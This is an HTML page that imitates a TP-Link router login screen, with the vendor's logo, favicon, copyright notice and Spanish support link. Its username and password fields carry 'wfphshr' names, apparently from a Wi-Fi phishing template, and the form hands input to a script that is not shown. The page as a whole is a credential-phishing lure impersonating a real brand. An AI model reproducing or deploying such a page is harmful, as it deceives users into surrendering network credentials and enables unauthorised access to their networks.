<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/stylesheet.css">
    <title>TP-Link | Log In</title>
    <link rel="shortcut icon" href="https://static.tp-link.com/favicon.ico" type="image/x-icon">
</head>
<body>
    
    <!-- <img src="img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image"> -->
    <div class="lang-select">
        <select name="lang" id="lang">
            <option value="esp">Español</option>
            <option value="eng">English</option>
        </select>
    </div>
        
    <section class="container">
        <div class="form-head">
            <a href="https://www.tp-link.com/" target="_blank">
                <img src="img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
            </a>
        </div>
        <form id='form1'>
            <div class="form-group">
            <input type="text" class="form-control" placeholder="Username" name="wfphshr-email" required>
            </div>
            
            <div class="form-group">
                <input type="password" class="form-control" placeholder="Password" name="wfphshr-password" required>
            </div>

            <div class="form-btn">
                <button type="submit" class="btn">Login</button>
            </div>
            <div class="form-check">
                <small id="copyright" class="form-text text-muted">Copyright © 2020 TP-LINK Technologies Co., Ltd. All rights reserved.
                </small>
            </div>
        </form>
        
    </section>
    <div class="asist">
        <a href="https://www.tp-link.com/es/support/" target="_blank">Asistencia</a>
    </div>
    
    <script src="js/app.js"></script>
    <script src="js/jquery-3.5.1.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
